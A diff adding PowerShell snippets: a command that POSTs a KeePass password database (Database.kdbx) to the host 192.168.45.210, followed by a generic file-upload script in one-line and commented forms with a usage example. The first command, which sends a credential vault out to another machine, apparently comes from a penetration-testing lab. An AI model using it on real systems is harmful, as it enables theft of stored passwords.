@@ -1,0 +1,47 @@
+ $form = @{ files = Get-Item -Path "./Database.kdbx" }
+ $parameters = @{
+    Method = 'POST'
+    Uri = 'http://192.168.45.210/upload'
+    Form = $form
+}
+
+Invoke-restmethod @parameters
+
+
+
+
+
+
+param ([string]$filePath, [string]$url); if (-Not (Test-Path -Path $filePath)) { Write-Host "File not found: $filePath"; exit 1 }; $formData = @{ "files" = Get-Item -Path $filePath }; try { $response = Invoke-RestMethod -Uri $url -Method Post -Form $formData; Write-Host "Response from server:"; Write-Host $response } catch { Write-Host "An error occurred:"; Write-Host $_.Exception.Message }
+
+
+param (
+    [string]$filePath,
+    [string]$url
+)
+
+# Check if the file exists
+if (-Not (Test-Path -Path $filePath)) {
+    Write-Host "File not found: $filePath"
+    exit 1
+}
+
+# Prepare the form data
+$formData = @{
+    "files" = Get-Item -Path $filePath
+}
+
+try {
+    # Perform the file upload
+    $response = Invoke-RestMethod -Uri $url -Method Post -Form $formData
+
+    # Output the response from the server
+    Write-Host "Response from server:"
+    Write-Host $response
+} catch {
+    Write-Host "An error occurred:"
+    Write-Host $_.Exception.Message
+}
+
+
+.\UploadFile.ps1 -filePath "C:\path\to\your\file.txt" -url "http://example.com/upload"
